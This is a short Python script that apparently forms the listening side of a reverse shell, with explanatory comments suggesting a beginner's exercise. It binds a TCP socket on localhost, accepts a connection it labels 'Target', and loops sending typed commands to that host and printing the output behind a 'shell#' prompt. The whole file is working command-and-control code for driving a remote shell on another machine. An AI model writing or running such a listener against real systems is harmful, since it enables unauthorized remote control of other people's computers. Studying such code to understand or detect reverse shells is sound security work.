#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #firstP stands for IPv4, secondP specifies TCP connection
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #basic socket options. it allows to connect to a localhost
s.bind(("127.0.0.1", 15555)) #specify ip and port that we R going to listen on 
s.listen(5) #listen 5 connection
print("Listening for incoming connections")
target, ip = s.accept()
print("Target connected!")

while True:
	command = input("* shell#~%s: " % str(ip))
	target.send(command.encode())
	if command == "q":
		break
	else:
		result = target.recv(1024).decode() #recieving 1024 bytes
		print(result)

s.close()
